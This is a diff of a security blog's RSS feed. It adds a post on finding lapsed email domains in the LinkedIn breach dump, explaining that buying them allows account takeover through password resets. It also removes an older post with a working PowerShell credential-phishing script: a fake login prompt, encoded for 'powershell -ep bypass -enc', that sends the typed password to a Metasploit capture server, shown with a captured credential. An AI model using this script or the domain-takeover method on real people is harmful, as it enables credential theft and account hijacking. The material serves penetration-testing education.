@@ -7,8 +7,144 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>&amp;copy; 2016. All rights reserved.</copyright>
-    <lastBuildDate>Tue, 14 Jun 2016 07:35:28 -0500</lastBuildDate>
+    <lastBuildDate>Fri, 17 Jun 2016 07:35:28 -0500</lastBuildDate>
     <atom:link href="//room362.com/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Linkedin NXDOMAINs - Purchased Pwnage</title>
+      <link>//room362.com/post/2016/linkedin-nxdomains/</link>
+      <pubDate>Fri, 17 Jun 2016 07:35:28 -0500</pubDate>
+      
+      <guid>//room362.com/post/2016/linkedin-nxdomains/</guid>
+      <description>&lt;p&gt;I recently asked a friend if I could have just a list of the domains in the LinkedIn dump, no passwords, not full emails, just domains. I run a program that I lovingly call &amp;ldquo;DeepMagic&amp;rdquo; and I feed it domains whenever I can. Well, this time when I tossed the list of domains into the engine it started spitting out tons of errors. There was a total of &lt;strong&gt;9,436,804&lt;/strong&gt; unique domains names in the list, and for anyone who works with DNS that isn&amp;rsquo;t a very big number, so I didn&amp;rsquo;t think very much of it and didn&amp;rsquo;t know why it would choke on a list that small.&lt;/p&gt;
+
+&lt;p&gt;When I looked at the logs I noticed that there was a very large percentage of the domains that were coming up with NXDOMAIN. Most of the time this means that the domain isn&amp;rsquo;t registered, but can also mean that no name servers are registered for the domain (this usually happens when a corporation doesn&amp;rsquo;t want to maintain the domain but still wants to hold onto it for brand management).&lt;/p&gt;
+
+&lt;p&gt;I let the resolution keep going and just parsed out all of the NXDOMAINs, but when I saw the list of NXDOMAINs go over 90,000 and I wasn&amp;rsquo;t even out of the &amp;lsquo;A&amp;rsquo;s yet, I took a different approach. I sorted the list by count to find the most used domains (using of course my favorite &lt;code&gt;sort | uniq -c | sort -n&lt;/code&gt; that I think everyone who&amp;rsquo;s ever done text parsing on Linux knows).&lt;/p&gt;
+
+&lt;p&gt;It lead to a few surprises, first, people still use AOL and earthlink?&lt;/p&gt;
+
+&lt;p&gt;Second&amp;hellip; well just look for yourself:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;32952409 gmail.com
+24071552 hotmail.com
+20421035 yahoo.com
+4283225 aol.com
+1983431 comcast.net
+1431727 yahoo.co.in
+1337019 msn.com
+1041953 sbcglobal.net
+1039635 rediffmail.com
+995709 yahoo.fr
+916458 yahoo.co.uk
+845570 live.com
+841415 yahoo.com.br
+750175 hotmail.co.uk
+742597 verizon.net
+575381 hotmail.fr
+530308 ymail.com
+529548 cox.net
+510463 bellsouth.net
+504339 libero.it
+480006 att.net
+429760 yahoo.es
+407687 btinternet.com
+396313 mail.ru
+376970 googlemail.com
+307292 earthlink.net
+304012 mac.com
+266076 yahoo.in
+262010 yahoo.ca
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I&amp;rsquo;ve never heard of rediffmail, you?&lt;/p&gt;
+
+&lt;p&gt;Anyways, I pushed the list in this order into a simple script:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;cat domains_count.txt | xargs -P 100 -n 2 sh -c &#39;./findnx2.sh $1 $2&#39; argv0 | tee nxdomains.txt
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This is what is in &lt;code&gt;findnx2.sh&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/bash
+lines=$(nslookup ${2} | grep NXDOMAIN | wc -l)
+if [ $lines -eq &amp;quot;1&amp;quot; ]
+then
+	echo &amp;quot;$2 is open with count $1&amp;quot;
+fi
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And out popped a pretty interesting list (top 50):&lt;/p&gt;
+
+&lt;p&gt;domain -&amp;gt; number of email accounts registered under that domain (based on number of occurrences of the domain in the unfiltered list):&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;XXXXXXXXXXX is open with count 7606
+hotmail.con is open with count 4367
+c2i.net is open with count 3966
+yahoo.con is open with count 3487
+gmail.con is open with count 3249
+90wewhelp.ru is open with count 3218
+csupomona.edu is open with count 2844
+us.ing.com is open with count 2622
+test.linkedin.com is open with count 2583
+wowhackgold.com is open with count 2515
+yahoo.om is open with count 2461
+alltel.net is open with count 6565
+w.cn is open with count 2451
+uolsinectis.com.ar is open with count 2315
+gmail.fr is open with count 2830
+gmail.om is open with count 2122
+hotmail.cm is open with count 2044
+alltel.com is open with count 2046
+hotmail.om is open with count 1901
+memo.ikea.com is open with count 1809
+chicagogsb.edu is open with count 1758
+gawab.com is open with count 2141
+mscd.edu is open with count 1740
+mayalasr.com is open with count 1626
+yavvaram.com is open with count 1424
+twtelecom.com is open with count 1448
+asbada5m.com is open with count 1371
+eunet.yu is open with count 1272
+camerabuy.info is open with count 1156
+mywdo.com is open with count 1275
+g.mail.com is open with count 1089
+nortelnetworks.com is open with count 1815
+infotechsw.com is open with count 1040
+saugov.sa.gov.au is open with count 1033
+hoyllmail.com is open with count 1028
+mn.rr.com is open with count 1029
+apollogrp.edu is open with count 980
+gemail.com is open with count 1086
+v4q.info is open with count 928
+hoylmail.com is open with count 915
+yahoo.coom is open with count 890
+ifrance.com is open with count 917
+justafou.com is open with count 886
+2008radiochat.info is open with count 879
+myclearwave.net is open with count 967
+tconl.com is open with count 939
+gmail.cim is open with count 849
+flykingfisher.com is open with count 866
+lycos.co.uk is open with count 1092
+pichosti.info is open with count 813
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Basic analysis of this list:&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;I thought that LinkedIn validated sign ups with an email, kinda hard to do with all these domains that are obviously mistyped, unless of course they just keep the database record around indefinitely&lt;/li&gt;
+&lt;li&gt;XXXXXXXXX is an ISP that went out of business in 2011, their domain is available for register and would probably mean 7606 accounts up for grabs, if not more that&amp;rsquo;s why I redacted it, but I wanted to mention it just to demonstrate how powerful this type of analysis of a hacked site&amp;rsquo;s dump can be. $10 to purchase a domain is much cheaper and more wide spread than cracking time passwords just for LinkedIn (well, one can dream that everyone uses unique passwords).&lt;/li&gt;
+&lt;li&gt;WoWHackGold was also up for grabs, I picked it up just to see what kind of traffic is still going to it, these guys sold hacked WoW accounts so I don&amp;rsquo;t particularly feel inclined protect their info.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;What can someone do with this knowledge? Well, all they have to do to reset any of the accounts registered with one of these domains is simply purchase it, set up a catch-all email address and watch the account information roll in. The &amp;ldquo;accounts&amp;rdquo; they would have access to isn&amp;rsquo;t limited to LinkedIn either, could be anything that people use email addresses to sign up for.&lt;/p&gt;
+
+&lt;p&gt;/mubix&lt;/p&gt;
+
+&lt;p&gt;P.S. I have seen account take-overs of GMail accounts using &amp;ldquo;backup&amp;rdquo; accounts in this way. I assume Google has too since they ask me every so often now to make sure my backup email is correct.&lt;/p&gt;
+</description>
+    </item>
     
     <item>
       <title>SMB/HTTP Auth Capture via SCF File</title>
@@ -1179,110 +1315,6 @@ php_flag engine off
 &lt;p&gt;Hope this helps,&lt;/p&gt;
 
 &lt;p&gt;Rob&lt;/p&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>Powershell Popups &#43; Capture</title>
-      <link>//room362.com/post/2015/powershell-popups-and-capture/</link>
-      <pubDate>Mon, 12 Jan 2015 17:52:10 -0500</pubDate>
-      
-      <guid>//room362.com/post/2015/powershell-popups-and-capture/</guid>
-      <description>&lt;p&gt;Metasploit Minute has entered into it&amp;rsquo;s 3rd &amp;ldquo;season&amp;rdquo;. And we kick it off with using the Metasploit capture modules to capture creds from this powershell popup. The cool thing about this is you can leave it to execute on a system without any other code on disk and get creds constantly as any level of user. No admin, no UAC bypass needed. Just a bunch of creds for free.. over SSL. ;-)&lt;/p&gt;
-
-&lt;p&gt;Here is the video:&lt;/p&gt;
-
-&lt;iframe width=&#34;560&#34; height=&#34;315&#34; src=&#34;//www.youtube.com/embed/H_E3FNF8rBw&#34; frameborder=&#34;0&#34; allowfullscreen&gt;&lt;/iframe&gt;
-
-&lt;p&gt;Here is the code:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;$cred = $host.ui.promptforcredential(&#39;Failed Authentication&#39;,&#39;&#39;,[Environment]::UserDomainName + &amp;quot;\&amp;quot; + [Environment]::UserName,[Environment]::UserDomainName);[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
-$wc = new-object net.webclient;
-$wc.Headers.Add(&amp;quot;User-Agent&amp;quot;,&amp;quot;Wget/1.9+cvs-stable (Red Hat modified)&amp;quot;);
-$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
-$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
-$wc.credentials = new-object system.net.networkcredential($cred.username, $cred.getnetworkcredential().password, &#39;&#39;);
-$result = $wc.downloadstring(&#39;https://172.16.102.163&#39;);
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Lets break down the code line by line:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;$cred = $host.ui.promptforcredential(&#39;Failed Authentication&#39;,&#39;&#39;,[Environment]::UserName,[Environment]::UserDomainName);
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;This tells windows to prompt for credentials, with the title of &amp;ldquo;Failed Authentication&amp;rdquo;, no info in the comment (so it uses default), and include the username and domain in the box to add authenticity. Thats where all the magic is, everything else is just gravy.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Tells powershell not to verify SSL certificates (allows us to use self signed certs in the HTTPS transaction later&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;$wc = new-object net.webclient;
-$wc.Headers.Add(&amp;quot;User-Agent&amp;quot;,&amp;quot;Wget/1.9+cvs-stable (Red Hat modified)&amp;quot;);
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Creates a new webclient object and sets its user agent to &amp;lsquo;wget&amp;rsquo;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
-$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Tells powershell to use whatever proxy the current user uses with whatever credentials they have cached. If one or both are unnecessary it just ignores these settings.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;$wc.credentials = new-object system.net.networkcredential($cred.username, $cred.getnetworkcredential().password, &#39;&#39;);
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Tells powershell that the HTTP-Basic credentials to use are the ones typed in the popup box recently by the user.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;$result = $wc.downloadstring(&#39;https://172.16.102.163&#39;);
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;And finally the request to HTTP-Basic capture module in metasploit, but you could have anything you want capture these creds.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;cat power.txt | iconv --to-code UTF-16LE | base64
-
-JABjAHIAZQBkACAAPQAgACQAaABvAHMAdAAuAHUAaQAuAHAAcgBvAG0AcAB0AGYAbwByAGMAcgBlAGQAZQBuAHQAaQBhAGwAKAAnAEYAYQBpAGwAZQBkACAAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuACcALAAnACcALABbAEUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgBVAHMAZQByAEQAbwBtAGEAaQBuAE4AYQBtAGUAIAArACAAIgBcACIAIAArACAAWwBFAG4AdgBpAHIAbwBuAG0AZQBuAHQAXQA6ADoAVQBzAGUAcgBOAGEAbQBlACwAWwBFAG4AdgBpAHIAbwBuAG0AZQBuAHQAXQA6ADoAVQBzAGUAcgBEAG8AbQBhAGkAbgBOAGEAbQBlACkAOwAKAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAHIAdgBlAHIAQwBlAHIAdABpAGYAaQBjAGEAdABlAFYAYQBsAGkAZABhAHQAaQBvAG4AQwBhAGwAbABiAGEAYwBrACAAPQAgAHsAJAB0AHIAdQBlAH0AOwAKACQAdwBjACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ADsACgAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACIAVQBzAGUAcgAtAEEAZwBlAG4AdAAiACwAIgBXAGcAZQB0AC8AMQAuADkAKwBjAHYAcwAtAHMAdABhAGIAbABlACAAKABSAGUAZAAgAEgAYQB0ACAAbQBvAGQAaQBmAGkAZQBkACkAIgApADsACgAkAHcAYwAuAFAAcgBvAHgAeQAgAD0AIABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEQAZQBmAGEAdQBsAHQAVwBlAGIAUAByAG8AeAB5ADsACgAkAHcAYwAuAFAAcgBvAHgAeQAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAD0AIABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBDAHIAZQBkAGUAbgB0AGkAYQBsAEMAYQBjAGgAZQBdADoAOgBEAGUAZgBhAHUAbAB0AE4AZQB0AHcAbwByAGsAQwByAGUAZABlAG4AdABpAGEAbABzADsACgAkAHcAYwAuAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAD0AIABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAcwB5AHMAdABlAG0ALgBuAGUAdAAuAG4AZQB0AHcAbwByAGsAYwByAGUAZABlAG4AdABpAGEAbAAoACQAYwByAGUAZAAuAHUAcwBlAHIAbgBhAG0AZQAsACAAJABjAHIAZQBkAC4AZwBlAHQAbgBlAHQAdwBvAHIAawBjAHIAZQBkAGUAbgB0AGkAYQBsACgAKQAuAHAAYQBzAHMAdwBvAHIAZAAsACAAJwAnACkAOwAKACQAcgBlAHMAdQBsAHQAIAA9ACAAJAB3AGMALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwAxADcAMgAuADEANgAuADEAMAAyAC4AMQA2ADMAJwApADsACgA=
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Then execute &lt;code&gt;powershell -ep bypass -enc &amp;lt;the encoded text from above&amp;gt;&lt;/code&gt; and you get this:&lt;/p&gt;
-
-&lt;p&gt;Image should be here: &lt;img src=&#34;//room362.com/images/2015/powershellpopup.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;root@wpad:~/metasploit-framework# ./msfconsole -Lq
-msf &amp;gt; use auxiliary/server/capture/http_basic
-msf auxiliary(http_basic) &amp;gt; show options
-
-Module options (auxiliary/server/capture/http_basic):
-
-   Name         Current Setting  Required  Description
-   ----         ---------------  --------  -----------
-   REALM        Secure Site      yes       The authentication realm you&#39;d like to present.
-   RedirectURL                   no        The page to redirect users to after they enter basic auth creds
-   SRVHOST      0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
-   SRVPORT      80               yes       The local port to listen on.
-   SSL          false            no        Negotiate SSL for incoming connections
-   SSLCert                       no        Path to a custom SSL certificate (default is randomly generated)
-   SSLVersion   SSL3             no        Specify the version of SSL that should be used (accepted: SSL2, SSL3, TLS1)
-   URIPATH                       no        The URI to use for this exploit (default is random)
-
-msf auxiliary(http_basic) &amp;gt; set SSL true
-SSL =&amp;gt; true
-msf auxiliary(http_basic) &amp;gt; set SRVPORT 443
-SRVPORT =&amp;gt; 443
-msf auxiliary(http_basic) &amp;gt; set URIPATH /
-URIPATH =&amp;gt; /
-msf auxiliary(http_basic) &amp;gt; run
-[*] Auxiliary module execution completed
-msf auxiliary(http_basic) &amp;gt;
-[*] Listening on 0.0.0.0:443...
-[*] Using URL: https://0.0.0.0:443/
-[*]  Local IP: https://172.16.102.163:443/
-[*] Server started.
-[*] 172.16.102.140   http_basic - Sending 401 to client 172.16.102.140
-[+] 172.16.102.140 - Credential collected: &amp;quot;SITTINGDUCK\user:ASDqwe123&amp;quot; =&amp;gt; /
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Game over!&lt;/p&gt;
 </description>
     </item>
     
